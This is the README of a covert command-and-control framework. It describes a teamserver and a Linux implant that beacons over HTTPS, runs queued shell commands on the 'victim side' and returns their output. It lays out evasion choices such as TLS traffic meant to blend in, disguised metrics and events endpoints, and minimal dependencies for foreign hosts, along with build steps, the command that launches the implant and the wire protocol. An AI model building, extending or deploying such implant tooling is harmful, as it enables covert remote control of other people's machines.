<h4 align="center">A Micro Stealth C2 Framework built in C/C++</h4>

---

### Description 
myC2 is a small C2 framework aimed at stealthy operations. It is designed to be small, fast, and efficient. 

It is two binaries: a **teamserver** you give commands to, and an **implant** that
polls it over HTTPS for work and posts back whatever the command printed. The
implant never listens on a port.

### Features
- HTTPS-only transport on a port that blends in with ordinary TLS traffic.
- Beacon-based check-in: the implant polls the teamserver for work instead of holding a
  connection open.
- One `C2_HEADER` framing shared by both halves through `src/protocol.h`.
- An implant that links only `libssl`, `libcrypto` and `libc` — no libcurl, whose
  dependency tree does not exist on a foreign host.
- Self-signed certificates generated by the build, with the SAN configurable for the
  address victims actually connect to.

## Quick start

Requires CMake 3.16+, a C17/C++17 toolchain, OpenSSL development headers, and
`openssl` on `PATH`.

```sh
cmake -S . -B build
cmake --build build
```

The build produces two executables. Both are compiled with warnings as errors:

| Binary | Source | Role |
| --- | --- | --- |
| `build/server` | `src/server/server.cpp` | teamserver (operator side) |
| `build/agent` | `src/implant/agent.c` | Linux implant (victim side) |

Run the teamserver first, then the implant. The default certificate path is
relative, so run both from the project root:

```sh
./build/server
```

```sh
./build/agent --host 192.168.50.50
```

Anything typed at the `c2_server>` prompt is queued and handed to the implant on
its next check-in; its output is printed by the server as it arrives.

## The protocol

Every message is a 12-byte `C2_HEADER` followed by exactly `payload_size` bytes.
The header lives in `src/protocol.h` and is the only thing both halves share.

```c
struct C2_HEADER {
  uint32_t magic;        /* CHECK_IN_MAGIC, 0x41414141 */
  uint32_t command_id;   /* CMD_* below */
  uint32_t payload_size; /* bytes following the header */
};
```

| Constant | Value | Direction | Meaning |
| --- | --- | --- | --- |
| `CMD_CHECK_IN` | 100 | implant → server | No payload. The request body is the header alone. |
| `CMD_EXIT` | 101 | server → implant | No payload. Shut down. |
| `CMD_EXECUTE_SHELL` | 102 | both | Server sends the command; implant sends the output back. |

Fields are copied as-is, so they travel in **host byte order**. The implant and
the teamserver therefore have to agree on endianness; this is fine between two
x86-64 hosts and wrong across architectures.

The two endpoints are `POST /api/v2/metrics` (check-in, answers `200` with a
framed command or `204` when nothing is queued) and `POST /api/v2/events`
(upload, answers `200`). Both paths are defined once, as `C2_PATH_CHECKIN` and
`C2_PATH_RESULT` in `src/protocol.h`, so the two halves cannot drift apart. How
each half builds and validates those frames is described in its own README.

## Current limitations

- **Single session.** One global command queue and no session identifier, so two
  implants interleave each other's commands.
- **Sticky exit.** Once `exit` is typed, every later check-in is answered with
  `CMD_EXIT`.
- **Fixed cadence.** A command is only picked up on the next beacon, and the
  three-second interval has no jitter.
- **Small result size.** Implant output is capped at 4096 bytes.
- **No authentication.** Neither endpoint checks who is calling; anything that
  trusts the certificate can post to them.
- **Runtime floor.** The implant needs glibc 2.34 or newer and `libssl.so.3`,
  which means Debian 12, Ubuntu 22.04 or RHEL 9 and later.

`DEPLOYMENT.md` expands each of these into a backlog, with the deployment
consequences.
